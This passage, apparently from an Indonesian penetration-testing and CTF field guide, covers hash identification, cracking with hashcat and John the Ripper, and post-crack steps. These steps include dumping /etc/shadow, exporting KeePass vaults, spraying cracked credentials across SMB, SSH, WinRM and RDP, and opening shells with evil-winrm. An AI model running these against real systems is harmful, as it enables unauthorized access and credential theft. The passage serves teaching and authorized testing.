# Output MySQL 4.1+: *6C898D34C322F69269DFE0327C23537E99A025B1
# Hashcat mode: 300

# MSSQL (via impacket atau tool lain)
impacket-mssqlclient "sa:password@$TARGET" -windows-auth 2>/dev/null
# Di dalam: SELECT name, password_hash FROM sys.sql_logins

# PostgreSQL
psql -h $TARGET -U postgres -c "SELECT usename, passwd FROM pg_shadow;" 2>/dev/null
# Format: md5[32hex] → Hashcat mode khusus postgres

# Simpan hash dari DB ke file
echo "*6C898D34C322F69269DFE0327C23537E99A025B1" > $HASH_DIR/hashes/mysql.hash
```

---

## ═══════════════════════════════════════

## FASE 1: IDENTIFIKASI TIPE HASH

## ═══════════════════════════════════════

> **WAJIB DILAKUKAN.** Salah identifikasi = 0% success rate meski password ada di baris pertama wordlist.

### Langkah 1.1 — Identifikasi Otomatis (Gunakan Keduanya, Bandingkan)

Bash

```
# Simpan hash yang mau diidentifikasi
export HASH="5f4dcc3b5aa765d61d8327deb882cf99"

# Tool 1: Name-That-Hash (paling akurat, berbasis heuristic modern)
nth --text "$HASH"

# Tool 2: hashid (reliable, kasih langsung hashcat mode)
hashid -m -j "$HASH"

# Jika punya banyak hash dalam file:
nth --file $HASH_DIR/hashes/target.hash
hashid -m -j -f $HASH_DIR/hashes/target.hash
```

**OUTPUT BERHASIL ✅ — nth:**

text

```
Hash: 5f4dcc3b5aa765d61d8327deb882cf99

Most Likely:
[+] MD5 (Hashcat Mode: 0, John: raw-md5)
[+] NTLM (Hashcat Mode: 1000, John: nt)
[+] MD4 (Hashcat Mode: 900, John: raw-md4)
```

**OUTPUT BERHASIL ✅ — hashid:**

text

```
Analyzing '5f4dcc3b5aa765d61d8327deb882cf99'
[+] MD5 [Hashcat Mode: 0] [John the Ripper: raw-md5]
[+] NTLM [Hashcat Mode: 1000] [John the Ripper: nt]
```

---

### Langkah 1.2 — Identifikasi Manual (Tabel Referensi Cepat)

**Identifikasi berdasarkan panjang dan karakteristik:**

|Panjang|Prefix|Algoritma|Hashcat `-m`|John `--format`|
|---|---|---|---|---|
|32 hex|-|MD5 atau NTLM|0 atau 1000|raw-md5 atau nt|
|32 hex|`aad3b435...`|LM Hash kosong|3000|lm|
|40 hex|-|SHA-1|100|raw-sha1|
|40 hex|`*`|MySQL 4.1+|300|mysql-sha1|
|60 chars|`$2a$`,`$2b$`,`$2y$`|bcrypt|3200|bcrypt|
|64 hex|-|SHA-256|1400|raw-sha256|
|128 hex|-|SHA-512|1700|raw-sha512|
|Varies|`$1$`|MD5crypt|500|md5crypt|
|Varies|`$5$`|SHA256crypt|7400|sha256crypt|
|Varies|`$6$`|SHA512crypt|1800|sha512crypt|
|Varies|`$y$`|yescrypt|N/A|crypt|
|Varies|`$krb5tgs$23$`|Kerberoast|13100|krb5tgs|
|Varies|`$krb5asrep$23$`|ASREPRoast|18200|krb5asrep|
|Varies|`user::domain:...`|NetNTLMv2|5600|netntlmv2|
|35 chars|`md5` + 32hex|PostgreSQL|custom|postgres|
|140 hex|`0x0200`|MSSQL 2012+|1731|mssql08|

Bash

```
# Cek panjang hash dengan cepat
echo -n "$HASH" | wc -c

# Cek apakah ada prefix khusus
echo "$HASH" | grep -oP '^\$[0-9a-z]+\$'
```

---

### Langkah 1.3 — Cek Online Lookup DULU (Hemat Waktu!)

> **Selalu coba ini sebelum crack offline.** Jika hash sudah pernah dicrack orang lain, kamu bisa dapat hasilnya dalam detik.

Bash

```
# Method 1: CrackStation API (browser atau curl)
HASH="5f4dcc3b5aa765d61d8327deb882cf99"
curl -s "https://crackstation.net/" --data "hash=$HASH&submit=+Crack+Hashes+" 2>/dev/null | grep -i "password\|found"

# Method 2: Hashes.com API
curl -s "https://hashes.com/en/api/v1/decrypt" \
    -d "hashes[]=$HASH&api_key=" \
    -H "Content-Type: application/x-www-form-urlencoded" | python3 -m json.tool 2>/dev/null

# Method 3: Manual (buka browser)
echo "[*] Cek manual di:"
echo "    https://crackstation.net"
echo "    https://hashes.com/en/decrypt/hash"
echo "    https://md5decrypt.net"
echo ""
echo "[*] Copy-paste hash ini:"
echo "    $HASH"
```

**OUTPUT BERHASIL ✅ — Hash ditemukan online:**

text

```
{
  "success": true,
  "result": [{"hash": "5f4dcc3b5aa765d61d8327deb882cf99", "plain": "password"}]
}
```

➡️ **SELESAI!** Simpan password:

Bash

```
echo "$HASH:password" >> $HASH_DIR/cracked/results.txt
echo "[+] CRACKED: $HASH = password"
```

**OUTPUT GAGAL ❌ — Hash tidak ditemukan online:**

text

```
{"success": true, "result": [{"hash": "...", "plain": null}]}
```

➡️ Hash tidak ada di database online (salted, algoritma berat, atau password unik). Lanjut ke **FASE 2 — Offline Cracking**.

> **⚠️ PENTING — Jangan upload ke online jika:**
> 
> - Hash dari klien pentest nyata (melanggar NDA)
> - Hash mengandung data sensitif perusahaan
> - Engagement scope melarang sharing data

---

## ═══════════════════════════════════════

## FASE 2: STRATEGI CRACK OFFLINE

## ═══════════════════════════════════════

> **Decision point:** Pilih strategi berdasarkan tipe hash dan informasi yang kamu punya.

### Langkah 2.1 — Tentukan Strategi (Decision Matrix)

text

```
Tipe Hash → Strategi yang Disarankan:

MD5 / SHA-1 / NTLM (cepat)
    → Step 1: rockyou + no rules (cepat, 0-30 menit)
    → Step 2: rockyou + best64.rule (30-120 menit)
    → Step 3: rockyou + rockyou-30000.rule (berat)
    → Step 4: mask attack jika tahu format

SHA-512crypt / SHA-256crypt (sedang)
    → Step 1: rockyou + no rules (bisa berjam-jam)
    → Step 2: hanya tambah rules jika Step 1 gagal

bcrypt (lambat, ribuan kali lebih lambat dari MD5)
    → HANYA rockyou tanpa rules, -w 1 untuk VM
    → Pertimbangkan: apakah worth waktu?

NetNTLMv2 / Kerberoast / ASREPRoast
    → Langsung rockyou, mode 5600/13100/18200

File format (ZIP/SSH/PDF)
    → John the Ripper lebih direkomendasikan
```

---

### Langkah 2.2 — Siapkan File Hash dengan Format Benar

Bash

```
# PENTING: Format file hash berbeda untuk tiap tipe!

# Format 1: Hash biasa (1 per baris) - untuk MD5, SHA, NTLM
echo "5f4dcc3b5aa765d61d8327deb882cf99" > $HASH_DIR/hashes/target.hash
# Atau banyak hash sekaligus:
cat > $HASH_DIR/hashes/target.hash << 'EOF'
5f4dcc3b5aa765d61d8327deb882cf99
827ccb0eea8a706c4c34a16891f84e7b
ef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f
EOF

# Format 2: NTLM dari secretsdump - ambil kolom ke-4 SAJA
grep ":::" $HASH_DIR/hashes/sam_dump.txt | cut -d: -f4 > $HASH_DIR/hashes/ntlm.hash
# Verifikasi: setiap baris harus 32 karakter hex
cat $HASH_DIR/hashes/ntlm.hash | awk 'length==32' > /tmp/ntlm_valid.hash

# Format 3: NetNTLMv2 - SELURUH baris, tidak dipotong
# Contoh benar:
# diana::CORP:1122334455667788:B92C4A...:01010000...

# Format 4: Shadow - baris lengkap dari /etc/shadow
# $6$rounds=5000$saltsalt$wAmZ1c8G18Z8F1...

# Cek apakah file punya CRLF (Windows line endings) → bisa bikin cracking gagal
file $HASH_DIR/hashes/target.hash
# Jika output: "with CRLF line terminators"
dos2unix $HASH_DIR/hashes/target.hash
echo "[*] CRLF cleaned"
```

---

## ═══════════════════════════════════════

## FASE 3: HASHCAT WORKFLOW

## ═══════════════════════════════════════

### Langkah 3.1 — Dictionary Attack (Selalu Mulai Dari Sini)

Bash

```
# Tentukan MODE berdasarkan hasil identifikasi di Fase 1
# Ganti MODE dengan angka yang sesuai (0, 1000, 1800, dll)
export MODE=0  # ubah ini sesuai tipe hash

# Command 1: Baseline — rockyou tanpa rules (paling cepat)
hashcat -m $MODE \
    $HASH_DIR/hashes/target.hash \
    /usr/share/wordlists/rockyou.txt \
    --force -O \
    -o $HASH_DIR/cracked/results.txt \
    --status --status-timer=30

# Command 2: Jika di VM dan mau lebih stabil (kurangi workload)
hashcat -m $MODE \
    $HASH_DIR/hashes/target.hash \
    /usr/share/wordlists/rockyou.txt \
    --force -O -w 2 \
    -o $HASH_DIR/cracked/results.txt
```

**Monitoring selama hashcat berjalan:**

text

```
# Tekan [s] untuk status update
# Output yang kamu lihat:
Session..........: hashcat
Status...........: Running
Hash.Mode........: 0 (MD5)
Time.Started.....: Wed Oct 18 16:12:04 2023 (5 secs)
Time.Estimated...: Wed Oct 18 16:12:14 2023 (10 secs)
Speed.#1.........: 1845.2 kH/s (0.15ms)   ← kecepatan
Progress.........: 9231250/14344385 (64.35%)
Recovered........: 0/1 (0.00%) Digests     ← belum ada yang crack
```

**OUTPUT BERHASIL ✅ — Hash cracked:**

text

```
5f4dcc3b5aa765d61d8327deb882cf99:password

Session..........: hashcat
Status...........: Cracked
Recovered........: 1/1 (100.00%) Digests
```

➡️ **Crack berhasil!** Lihat hasilnya:

Bash

```
# Tampilkan semua yang berhasil dicrack
hashcat -m $MODE $HASH_DIR/hashes/target.hash --show

# Atau lihat file output
cat $HASH_DIR/cracked/results.txt

# Format output: hash:password
# Simpan dengan info lengkap
echo "[+] CRACKED at $(date): $(cat $HASH_DIR/cracked/results.txt)" \
    >> $HASH_DIR/cracked/session_log.txt
```

**OUTPUT GAGAL ❌ — Status: Exhausted:**

text

```
Status...........: Exhausted
Recovered........: 0/1 (0.00%) Digests
```

➡️ rockyou tanpa rules tidak berhasil. Lanjut ke **Langkah 3.2 — Mutation Rules**.

**OUTPUT GAGAL ❌ — "All hashes found in potfile":**

text

```
All hashes found in potfile! Use --show to display them.
```

➡️ Hash sudah pernah dicrack sebelumnya! Tinggal tampilkan:

Bash

```
hashcat -m $MODE $HASH_DIR/hashes/target.hash --show
```

---

### Langkah 3.2 — Dictionary + Mutation Rules

Bash

```
# Lihat rules yang tersedia
ls /usr/share/hashcat/rules/
# Output: best64.rule, combinator.rule, d3ad0ne.rule, dive.rule,
#         generated.rule, generated2.rule, leetspeak.rule, 
#         rockyou-30000.rule, toggles*.rule, T0XlC.rule, ...

# Command 1: best64.rule (64 mutasi per kata, cepat & efektif)
hashcat -m $MODE \
    $HASH_DIR/hashes/target.hash \
    /usr/share/wordlists/rockyou.txt \
    -r /usr/share/hashcat/rules/best64.rule \
    --force -O \
    -o $HASH_DIR/cracked/results.txt

# Command 2: rockyou-30000.rule (lebih agresif, lebih lambat)
hashcat -m $MODE \
    $HASH_DIR/hashes/target.hash \
    /usr/share/wordlists/rockyou.txt \
    -r /usr/share/hashcat/rules/rockyou-30000.rule \
    --force \
    -o $HASH_DIR/cracked/results.txt

# Command 3: d3ad0ne.rule (rule kompleks, bagus untuk password korporat)
hashcat -m $MODE \
    $HASH_DIR/hashes/target.hash \
    /usr/share/wordlists/rockyou.txt \
    -r /usr/share/hashcat/rules/d3ad0ne.rule \
    --force -O

# Command 4: Stacking 2 rules sekaligus
hashcat -m $MODE \
    $HASH_DIR/hashes/target.hash \
    /usr/share/wordlists/rockyou.txt \
    -r /usr/share/hashcat/rules/best64.rule \
    -r /usr/share/hashcat/rules/leetspeak.rule \
    --force -O
```

**Contoh mutasi yang dilakukan best64.rule:**

text

```
password → Password    (c = capitalize first)
password → password1   ($1 = append "1")
password → PASSWORD    (u = uppercase all)
password → p@ssword    (sa@ = substitute a→@)
password → dr0wssap    (r = reverse)
password → pass        (] = remove last char)
```

**OUTPUT BERHASIL ✅ — Crack dengan rules:**

text

```
5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8:Password1
```

**OUTPUT GAGAL ❌ — Masih Exhausted setelah rules:**  
➡️ Password kemungkinan:

- Menggunakan kata yang tidak ada di rockyou
- Format PIN/angka saja
- Password unik spesifik target

➡️ Lanjut ke **Langkah 3.3 — Mask Attack** atau **Langkah 3.5 — Custom Wordlist**

---

### Langkah 3.3 — Mask Attack (Brute Force Terarah)

> Gunakan ini jika tahu sebagian format password (panjang, apakah ada angka di akhir, dll).

Bash

```
# Charset yang tersedia:
# ?l = lowercase (a-z)
# ?u = uppercase (A-Z)
# ?d = digit (0-9)
# ?s = special (!@#$%...)
# ?a = all printable (?l?u?d?s)

# Skenario 1: PIN 4 digit (ATM/padlock)
hashcat -m $MODE $HASH_DIR/hashes/target.hash \
    -a 3 '?d?d?d?d' --force

# Skenario 2: PIN 6 digit
hashcat -m $MODE $HASH_DIR/hashes/target.hash \
    -a 3 '?d?d?d?d?d?d' --force

# Skenario 3: Password korporat umum (Kapital + huruf kecil × 5 + 2 angka)
# Contoh: Admin01, Summer23, Dragon99
hashcat -m $MODE $HASH_DIR/hashes/target.hash \
    -a 3 '?u?l?l?l?l?l?d?d' --force

# Skenario 4: Password dengan simbol di akhir (Wordlist+mask hybrid)
# Contoh: password!, summer#, dragon@
hashcat -m $MODE $HASH_DIR/hashes/target.hash \
    -a 6 /usr/share/wordlists/rockyou.txt '?s' --force

# Skenario 5: Tahun di akhir (paling umum: 2023, 2024)
hashcat -m $MODE $HASH_DIR/hashes/target.hash \
    -a 6 /usr/share/wordlists/rockyou.txt '?d?d?d?d' --force

# Skenario 6: Angka di depan + kata (01password, 99dragon)
hashcat -m $MODE $HASH_DIR/hashes/target.hash \
    -a 7 '?d?d' /usr/share/wordlists/rockyou.txt --force

# Skenario 7: Semua kombinasi 1-8 karakter lowercase (WARNING: Lama!)
hashcat -m $MODE $HASH_DIR/hashes/target.hash \
    -a 3 --increment --increment-min=1 --increment-max=8 '?l?l?l?l?l?l?l?l' --force
```

**OUTPUT BERHASIL ✅ — Mask berhasil:**

text

```
[hash]:Summer24
Status...........: Cracked
```

**OUTPUT GAGAL ❌ — Mask exhausted:**  
➡️ Format password tidak sesuai pola yang dicoba. Perlu informasi lebih untuk menyempurnakan mask. Lanjut ke Langkah 3.4 atau 3.5.

---

### Langkah 3.4 — Mode Khusus untuk Hash Populer

Bash

```
# ═══ NTLM (Windows) ═══
hashcat -m 1000 $HASH_DIR/hashes/ntlm.hash \
    /usr/share/wordlists/rockyou.txt --force -O

# ═══ NetNTLMv2 (dari Responder) ═══
hashcat -m 5600 $HASH_DIR/hashes/netntlmv2_clean.txt \
    /usr/share/wordlists/rockyou.txt --force

# ═══ Kerberoasting TGS ═══
hashcat -m 13100 $HASH_DIR/hashes/kerberoast.hash \
    /usr/share/wordlists/rockyou.txt --force

# ═══ ASREPRoasting ═══
hashcat -m 18200 $HASH_DIR/hashes/asrep.hash \
    /usr/share/wordlists/rockyou.txt --force

# ═══ Linux SHA-512 shadow ═══
hashcat -m 1800 $HASH_DIR/hashes/shadow.hash \
    /usr/share/wordlists/rockyou.txt --force -O

# ═══ bcrypt (PERLAHAN! -w 1 wajib di VM) ═══
hashcat -m 3200 $HASH_DIR/hashes/bcrypt.hash \
    /usr/share/wordlists/rockyou.txt \
    -w 1 --force
# ⚠️ bcrypt bisa makan waktu BERJAM-JAM. Pertimbangkan nilai informasinya.

# ═══ MySQL 4.1+ ═══
hashcat -m 300 $HASH_DIR/hashes/mysql.hash \
    /usr/share/wordlists/rockyou.txt --force -O

# ═══ WPA2 WiFi ═══
hashcat -m 22000 capture.hc22000 \
    /usr/share/wordlists/rockyou.txt --force
```

---

### Langkah 3.5 — Custom Wordlist (Jika rockyou Gagal)

> Ketika password target menggunakan kata internal organisasi.

Bash

```
# Method 1: CeWL — scrape website target untuk terminologi spesifik
# Berguna jika target perusahaan dengan nama/istilah khas
cewl https://target-company.com -d 2 -m 6 \
    -w $HASH_DIR/wordlists/cewl_target.txt

echo "[+] CeWL wordlist: $(wc -l < $HASH_DIR/wordlists/cewl_target.txt) words"

# Gabungkan dengan rockyou untuk cakupan lebih luas
cat /usr/share/wordlists/rockyou.txt $HASH_DIR/wordlists/cewl_target.txt \
    | sort -u > $HASH_DIR/wordlists/combined.txt

hashcat -m $MODE $HASH_DIR/hashes/target.hash \
    $HASH_DIR/wordlists/combined.txt \
    -r /usr/share/hashcat/rules/best64.rule \
    --force -O

# Method 2: Crunch — generate berdasarkan pola yang diketahui
# Misalnya: tahu password format "Company" + 4 angka
crunch 11 11 -t Company%%%% -o $HASH_DIR/wordlists/company_pattern.txt
# Menghasilkan: Company0000, Company0001... Company9999

hashcat -m $MODE $HASH_DIR/hashes/target.hash \
    $HASH_DIR/wordlists/company_pattern.txt --force

# Method 3: CUPP — profil target dari info OSINT
git clone https://github.com/Mebus/cupp.git /tmp/cupp 2>/dev/null
python3 /tmp/cupp/cupp.py -i
# Jawab pertanyaan tentang target (nama, tanggal lahir, dll)
# Output: target_name.txt → gunakan sebagai wordlist

# Method 4: Wordlist dari SecLists (lebih bervariasi dari rockyou)
ls /usr/share/seclists/Passwords/
hashcat -m $MODE $HASH_DIR/hashes/target.hash \
    /usr/share/seclists/Passwords/xato-net-10-million-passwords.txt \
    --force -O
```

---

## ═══════════════════════════════════════

## FASE 4: JOHN THE RIPPER WORKFLOW

## ═══════════════════════════════════════

> John lebih unggul untuk: file format extraction, Linux shadow parsing, auto-detect algoritma.

### Langkah 4.1 — Crack Dasar dengan John

Bash

```
# Command 1: Auto-detect format + rockyou
john $HASH_DIR/hashes/target.hash \
    --wordlist=/usr/share/wordlists/rockyou.txt

# Command 2: Spesifik format (lebih cepat)
john $HASH_DIR/hashes/target.hash \
    --format=raw-md5 \
    --wordlist=/usr/share/wordlists/rockyou.txt

# Command 3: Single crack mode (pakai info username untuk tebak password)
john $HASH_DIR/hashes/target.hash --single

# Command 4: Dengan rules
john $HASH_DIR/hashes/target.hash \
    --wordlist=/usr/share/wordlists/rockyou.txt \
    --rules=best64

# Lihat hasil
john $HASH_DIR/hashes/target.hash --show

# John menyimpan cracked di: ~/.john/john.pot
cat ~/.john/john.pot
```

**OUTPUT BERHASIL ✅:**

text

```
password         (victim)
1 password hash cracked, 0 left
```

**OUTPUT GAGAL ❌ — "No password hashes loaded":**

text

```
No password hashes loaded (see FAQ)
```

➡️ Format tidak dikenali auto-detect:

Bash

```
# Lihat format yang tersedia
john --list=formats | grep -i "md5\|ntlm\|sha"

# Coba tentukan format manual
john $HASH_DIR/hashes/target.hash --format=nt --wordlist=/usr/share/wordlists/rockyou.txt
john $HASH_DIR/hashes/target.hash --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt
```

---

### Langkah 4.2 — Crack File Terproteksi (Full Pipeline)

Bash

```
# ═══ ZIP Archive ═══
zip2john secret.zip > /tmp/zip.hash
john /tmp/zip.hash --wordlist=/usr/share/wordlists/rockyou.txt
john /tmp/zip.hash --show
# Output: secret.zip:hunter2:file.txt:secret.zip

# Jika berhasil crack, extract ZIP:
unzip -P "hunter2" secret.zip -d ./extracted_zip/

# ═══ RAR Archive ═══
rar2john backup.rar > /tmp/rar.hash
john /tmp/rar.hash --wordlist=/usr/share/wordlists/rockyou.txt
john /tmp/rar.hash --show
# Extract: rar x -p"password" backup.rar ./extracted/

# ═══ SSH Private Key ═══
ssh2john id_rsa > /tmp/ssh.hash
john /tmp/ssh.hash --wordlist=/usr/share/wordlists/rockyou.txt
john /tmp/ssh.hash --show
# Output: id_rsa:superman123

# Gunakan key dengan passphrase:
ssh -i id_rsa user@$TARGET
# Masukkan passphrase: superman123

# ═══ PDF ═══
pdf2john document.pdf > /tmp/pdf.hash
john /tmp/pdf.hash --wordlist=/usr/share/wordlists/rockyou.txt
john /tmp/pdf.hash --show
# Buka PDF: evince document.pdf (masukkan password saat diminta)

# ═══ KeePass ═══
keepass2john database.kdbx > /tmp/kdbx.hash
john /tmp/kdbx.hash --wordlist=/usr/share/wordlists/rockyou.txt
john /tmp/kdbx.hash --show
# Output: PersonalVault:masterpass123
# Buka: keepassxc database.kdbx (GUI) atau tools CLI
```

**OUTPUT GAGAL ❌ — John tidak bisa crack setelah rockyou:**

text

```
0 password hashes cracked, 0 left
```

➡️ Coba dengan rules:

Bash

```
john /tmp/zip.hash \
    --wordlist=/usr/share/wordlists/rockyou.txt \
    --rules=best64

# Atau coba wordlist lain
john /tmp/zip.hash \
    --wordlist=/usr/share/seclists/Passwords/darkweb2017-top10000.txt

# Coba mask brute force via john
john /tmp/zip.hash --mask='?d?d?d?d?d?d'  # 6 digit PIN
john /tmp/zip.hash --mask='?u?l?l?l?d?d'  # Format Worddd
```

---

### Langkah 4.3 — Linux Shadow dengan unshadow

Bash

```
# Gabungkan passwd + shadow untuk context username
sudo unshadow /etc/passwd /etc/shadow > /tmp/unshadowed.txt

john /tmp/unshadowed.txt \
    --wordlist=/usr/share/wordlists/rockyou.txt

john /tmp/unshadowed.txt --show
```

**OUTPUT BERHASIL ✅:**

text

```
victim:password123:1000:1000:Victim User:/home/victim:/bin/bash
developer:letmein!:1001:1001:Developer:/home/developer:/bin/bash
2 password hashes cracked, 0 left
```

---

## ═══════════════════════════════════════

## FASE 5: KETIKA SEMUA GAGAL — ADVANCED STRATEGIES

## ═══════════════════════════════════════

### Langkah 5.1 — Investigasi Konteks Target (OSINT untuk Password)

> Sebelum brute force buta, cari clue password dari informasi yang sudah dikumpulkan.

Bash

```
# Cek file yang sudah didownload sebelumnya (dari SMB, FTP, dll)
grep -ri "password\|passwd\|secret\|credential" ~/smb_loot/files/ 2>/dev/null | head -30
grep -ri "pass" ~/smb_loot/files/*.txt 2>/dev/null
grep -ri "pass" ~/smb_loot/files/*.conf 2>/dev/null

# Cek nama perusahaan/departemen/hostname dari scan sebelumnya
cat ~/smb_loot/nmap_*.txt 2>/dev/null | grep -i "name\|domain\|hostname"

# Buat custom wordlist dari konteks
cat > $HASH_DIR/wordlists/context_words.txt << 'EOF'
CompanyName
company2024
COMPANY2024!
CompanyName2024
Summer2024
Winter2023
Spring2024
Admin@2024
Welcome123!
P@ssw0rd
EOF

# Tambahkan hostname dan domain name
echo "FILE01" >> $HASH_DIR/wordlists/context_words.txt
echo "CORP2024" >> $HASH_DIR/wordlists/context_words.txt

# Crack dengan context wordlist + rules
hashcat -m $MODE $HASH_DIR/hashes/target.hash \
    $HASH_DIR/wordlists/context_words.txt \
    -r /usr/share/hashcat/rules/best64.rule \
    --force -O
```

---

### Langkah 5.2 — Wordlist yang Lebih Besar

Bash

```
# Cek apakah SecLists tersedia
ls /usr/share/seclists/Passwords/ 2>/dev/null || sudo apt install -y seclists

# Hierarchy wordlist dari kecil ke besar (urutkan penggunaan)
declare -a WORDLISTS=(
    "/usr/share/seclists/Passwords/darkweb2017-top10000.txt"
    "/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt"
    "/usr/share/seclists/Passwords/xato-net-10-million-passwords.txt"
    "/usr/share/wordlists/rockyou.txt"
    "/usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt"
)

for WL in "${WORDLISTS[@]}"; do
    if [ -f "$WL" ]; then
        echo "[*] Trying: $WL ($(wc -l < $WL) lines)"
        hashcat -m $MODE $HASH_DIR/hashes/target.hash "$WL" \
            --force -O --status-timer=60 -q
        
        # Cek apakah berhasil
        RESULT=$(hashcat -m $MODE $HASH_DIR/hashes/target.hash --show 2>/dev/null)
        if [ -n "$RESULT" ]; then
            echo "[+] CRACKED with $WL: $RESULT"
            break
        fi
    fi
done
```

---

### Langkah 5.3 — Google Dork untuk Hash Leak

> Kadang hash sudah ada di internet dari kebocoran data sebelumnya.

Bash

```
# Saat buntu, coba search hash di Google
echo "[*] Coba Google dork berikut:"
echo "    \"$HASH\" site:github.com"
echo "    \"$HASH\" site:pastebin.com"
echo "    \"$HASH\" password"
echo ""
echo "[*] Atau cari di situs leak:"
echo "    https://haveibeenpwned.com/Passwords"
echo "    https://dehashed.com"
echo "    https://intelx.io"
echo "    https://leakix.net"
```

---

### Langkah 5.4 — Manajemen Sesi Hashcat (Untuk Hash Berat)

Bash

```
# Jalankan dengan nama sesi dan bisa resume nanti
hashcat -m 3200 $HASH_DIR/hashes/bcrypt.hash \
    /usr/share/wordlists/rockyou.txt \
    --session bcrypt_crack \
    -w 1 --force \
    --status --status-timer=60

# Jika perlu stop dan lanjut lain kali:
# Tekan [q] untuk quit dengan save checkpoint

# Resume sesi
hashcat --restore --session bcrypt_crack

# Cek sesi yang tersimpan
ls ~/.local/share/hashcat/sessions/

# Benchmark kecepatan crack di mesin ini (untuk estimasi waktu)
hashcat -b -m 3200 --force  # bcrypt benchmark
hashcat -b -m 1000 --force  # NTLM benchmark
hashcat -b -m 0 --force     # MD5 benchmark
```

**Interpretasi benchmark:**

text

```
# Contoh output benchmark
Speed.#1.........: 12345 H/s (bcrypt)    ← sangat lambat
Speed.#1.........: 1234.5 MH/s (MD5)     ← sangat cepat

# Estimasi waktu rockyou (14.3 juta kata):
# MD5 @ 1234 MH/s  = < 1 detik
# bcrypt @ 12 kH/s = ~1200 detik = ~20 menit (di GPU)
# bcrypt @ 100 H/s = ~143.000 detik = ~40 jam (di VM CPU!)
```

---

## ═══════════════════════════════════════

## FASE 6: AFTER CRACK — APA YANG DILAKUKAN DENGAN PASSWORD

## ═══════════════════════════════════════

### Langkah 6.1 — Validasi & Simpan Credentials

Bash

```
# Setelah dapat password, tampilkan semua hasil
hashcat -m $MODE $HASH_DIR/hashes/target.hash --show
# atau
john $HASH_DIR/hashes/target.hash --show

# Simpan dengan terstruktur
cat > $HASH_DIR/cracked/session_summary.txt << EOF
=== CRACKING SESSION SUMMARY ===
Date: $(date)
Target: $TARGET
Hash Mode: $MODE
Results:
$(hashcat -m $MODE $HASH_DIR/hashes/target.hash --show 2>/dev/null)
$(john $HASH_DIR/hashes/target.hash --show 2>/dev/null)
EOF

cat $HASH_DIR/cracked/session_summary.txt

# Export username:password pairs
hashcat -m $MODE $HASH_DIR/hashes/target.hash --show \
    | awk -F: '{print $NF}' > $HASH_DIR/cracked/plaintext_passwords.txt
```

---

### Langkah 6.2 — Test Credentials ke Service Lain (Cross-Service)

Bash

```
# Password yang didapat dari cracking hash → test ke semua service aktif
export CRACKED_PASS=$(hashcat -m 1000 $HASH_DIR/hashes/ntlm.hash --show | cut -d: -f2)
export CRACKED_USER="victim"  # sesuaikan

echo "[*] Testing $CRACKED_USER:$CRACKED_PASS ke semua service..."

# Test SMB
nxc smb $TARGET -u "$CRACKED_USER" -p "$CRACKED_PASS" 2>/dev/null

# Test SSH
nxc ssh $TARGET -u "$CRACKED_USER" -p "$CRACKED_PASS" 2>/dev/null

# Test WinRM
nxc winrm $TARGET -u "$CRACKED_USER" -p "$CRACKED_PASS" 2>/dev/null

# Test FTP
nxc ftp $TARGET -u "$CRACKED_USER" -p "$CRACKED_PASS" 2>/dev/null

# Test RDP
nxc rdp $TARGET -u "$CRACKED_USER" -p "$CRACKED_PASS" 2>/dev/null

# Test MSSQL
nxc mssql $TARGET -u "$CRACKED_USER" -p "$CRACKED_PASS" 2>/dev/null
```

**OUTPUT BERHASIL ✅ — WinRM Pwn3d:**

text

```
WINRM  10.10.11.200  5985  FILE01  [+] CORP\victim:Password123! (Pwn3d!)
```

➡️ Akses shell:

Bash

```
evil-winrm -i $TARGET -u "$CRACKED_USER" -p "$CRACKED_PASS"
# → ke <a href="/docs/windows-privesc" class="text-[#00b4d8] hover:underline font-mono font-semibold">45_windows_privesc_workflow.md</a>
```

**OUTPUT BERHASIL ✅ — SMB valid:**

text

```
SMB  10.10.11.200  445  FILE01  [+] CORP\victim:Password123!
```

➡️ Lanjut ke **[05. SMB & Samba Exploitation Workflow — Master Field Guide](/docs/smb-samba)** Fase 6 (Authenticated Enumeration)

---

### Langkah 6.3 — Jika Password dari KeePass/Shadow → Cari Lebih

Bash

```
# Jika berhasil crack KeePass database
# Buka dan dump semua password di dalamnya
keepassxc-cli export database.kdbx --format csv \
    > $HASH_DIR/cracked/keepass_dump.csv 2>/dev/null
# Masukkan master password saat diminta

cat $HASH_DIR/cracked/keepass_dump.csv

# Jika berhasil crack shadow Linux dan dapat root
# → Bisa dump seluruh shadow dan crack semua user lain
sudo cat /etc/shadow > $HASH_DIR/hashes/full_shadow.txt
sudo unshadow /etc/passwd /etc/shadow > $HASH_DIR/hashes/full_unshadowed.txt
john $HASH_DIR/hashes/full_unshadowed.txt \
    --wordlist=/usr/share/wordlists/rockyou.txt
john $HASH_DIR/hashes/full_unshadowed.txt --show
```

---

## ═══════════════════════════════════════

## POLA CTF YANG SERING MUNCUL (8 PATTERN)

## ═══════════════════════════════════════

### Pattern 1 — MD5 di Source Code Web

Bash

```
# Kamu temukan di source code:
# if (md5($_POST['token']) === '827ccb0eea8a706c4c34a16891f84e7b')

echo "827ccb0eea8a706c4c34a16891f84e7b" > /tmp/p1.hash
# Cek online dulu
curl -s "https://hashes.com/en/api/v1/decrypt" \
    -d "hashes[]=827ccb0eea8a706c4c34a16891f84e7b" 2>/dev/null | python3 -m json.tool

# Jika tidak ada, crack offline
hashcat -m 0 /tmp/p1.hash /usr/share/wordlists/rockyou.txt --force -O
# Output: 827ccb0eea8a706c4c34a16891f84e7b:12345
```

### Pattern 2 — Encrypted SSH Key di SMB Share

Bash

```
# Kamu download id_rsa dari SMB share, tapi minta passphrase saat login
chmod 600 id_rsa
ssh -i id_rsa user@$TARGET
# Output: Enter passphrase for key 'id_rsa':

# Crack passphrase
ssh2john id_rsa > /tmp/p2.hash
john /tmp/p2.hash --wordlist=/usr/share/wordlists/rockyou.txt
john /tmp/p2.hash --show
# Output: id_rsa:phoenix

# Login dengan passphrase
ssh -i id_rsa user@$TARGET
# Masukkan: phoenix
# → Lanjut ke <a href="/docs/ssh" class="text-[#00b4d8] hover:underline font-mono font-semibold">06_ssh_workflow.md</a>
```

### Pattern 3 — ZIP dengan flag.txt di dalamnya

Bash

```
unzip secret.zip
# Output: password required

zip2john secret.zip > /tmp/p3.hash
john /tmp/p3.hash --wordlist=/usr/share/wordlists/rockyou.txt
john /tmp/p3.hash --show
# Output: secret.zip:dragon123

unzip -P "dragon123" secret.zip
cat flag.txt
```

### Pattern 4 — NTLM Hash dari SAM Dump

Bash

```
# Dapat dari SMB exploitation:
